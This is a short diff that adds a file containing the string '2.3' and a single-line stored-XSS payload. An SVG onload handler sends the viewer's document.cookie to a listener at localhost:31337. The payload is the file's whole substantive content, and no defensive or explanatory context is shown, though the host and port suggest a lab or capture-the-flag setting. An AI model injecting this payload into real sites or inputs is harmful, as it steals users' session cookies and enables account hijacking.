@@ -1,0 +1,5 @@
+
+
+2.3
+<svg/onload=document.location='http://localhost:31337/stolen?cookies='+document.cookie;>
+
